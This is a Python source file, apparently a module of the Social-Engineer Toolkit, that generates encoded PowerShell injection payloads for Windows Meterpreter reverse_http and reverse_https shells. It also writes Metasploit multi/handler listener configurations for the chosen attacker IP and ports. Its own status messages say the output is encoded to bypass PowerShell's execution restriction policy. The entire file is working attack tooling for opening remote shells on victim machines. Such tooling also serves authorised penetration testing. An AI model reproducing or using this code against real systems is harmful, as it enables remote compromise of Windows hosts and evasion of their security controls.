#!/usr/bin/python
import sys
import subprocess
import re
import os
import time
from src.core.setcore import *

# grab ipaddress
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = raw_input("Enter the ipaddress for the reverse connection: ")
    update_options("IPADDR=" + ipaddr)

# check to see if we are using multi powershell injection
multi_injection = check_config("POWERSHELL_MULTI_INJECTION=").lower()

# check what payloads we are using
powershell_inject_x64 = check_config("POWERSHELL_INJECT_PAYLOAD_X64=")
powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")

# if we specified a hostname then default to reverse https/http
if validate_ip(ipaddr) == False:
    powershell_inject_x64 = "windows/meterpreter/reverse_https"
    powershell_inject_x86 = "windows/meterpreter/reverse_http"

# prompt what port to listen on for powershell then make an append to the current
# metasploit answer file
if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
    # if we have multi injection on, don't worry about these
    if multi_injection != "on":
        print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
        port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
        if port == "": port = "443"
        fileopen = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "r")
        data = fileopen.read()
        match = re.search(port, data)
        if not match:
            filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
            filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, port))
            filewrite.close()

# if we have multi injection on, don't worry about these
if multi_injection != "on":
    # check to see if the meta config multi pyinjector is there
    if not os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
        if check_options("PORT=") != 0:
            port = check_options("PORT=")
        # if port.options isnt there then prompt
        else:
            port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
            if port == "": port = "443"
            update_options("PORT=" + port)

# if we are using multi powershell injection
if multi_injection == "on":
    print_status("Multi-Powershell-Injection is set to ON, this should be sweet...")

# define a base variable
x64 = ""
x86 = ""

# specify a list we will use for later
multi_injection_x86 = ""
multi_injection_x64 = ""

# here we do some funky loops so we don't need to rewrite the code below
if multi_injection == "on":
    port = check_config("POWERSHELL_MULTI_PORTS=")
    port = port.split(",")

if multi_injection == "on":
    # iterate through the ports, used for POWERSHELL_MULTI_PORTS
    for ports in port:
        # dont cycle through if theres a blank
        if ports != "":
            print_status("Generating x64-based powershell injection code for port: %s" % (ports))
            multi_injection_x64 = multi_injection_x64 + "," + generate_powershell_alphanumeric_payload(powershell_inject_x64, ipaddr, ports, x64)
            print_status("Generating x86-based powershell injection code for port: %s" % (ports))
            multi_injection_x86 = multi_injection_x86 + "," +  generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, ports, x86)

            if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
                port_check = check_ports("%s/src/program_junk/meta_config_multipyinjector" % (definepath), ports)
                if port_check == False:
                    filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
                    filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ports))
                    filewrite.close()

            # if we aren't using multi pyinjector
            if not os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
                # if meta config isn't created yet then create it
                if not os.path.isfile("%s/src/program_junk/meta_config" % (definepath)):
                    filewrite = file("%s/src/program_junk/meta_config" % (definepath), "w")
                    filewrite.write("")
                    filewrite.close()
                port_check = check_ports("%s/src/program_junk/meta_config" % (definepath), ports)
                if port_check == False:
                    filewrite = file("%s/src/program_junk/meta_config" % (definepath), "a")
                    filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\n set LHOST 0.0.0.0\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ports))
                    filewrite.close()

# if its turned to off
if multi_injection == "off":
    print_status("Generating x64-based powershell injection code...")
    x64 = generate_powershell_alphanumeric_payload(powershell_inject_x64, ipaddr, port, x64)
    print_status("Generating x86-based powershell injection code...")
    x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)

# if we are specifying multi powershell injection
if multi_injection == "on":
    x64 = multi_injection_x64[1:] # remove comma at beginning
    x86 = multi_injection_x86[1:] # remove comma at beginning

# check to see if we want to display the powershell command to the user
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
    print_status("Printing the x64 based encoded code...")
    time.sleep(3)
    print x64
    print_status("Printing the x86 based encoded code...")
    time.sleep(3)
    print x86


filewrite = file("%s/src/program_junk/x64.powershell" % (definepath), "w")
filewrite.write(x64)
filewrite.close()
filewrite = file("%s/src/program_junk/x86.powershell" % (definepath), "w")
filewrite.write(x86)
filewrite.close()
print_status("Finished generating powershell injection bypass.")
print_status("Encoded to bypass execution restriction policy...")
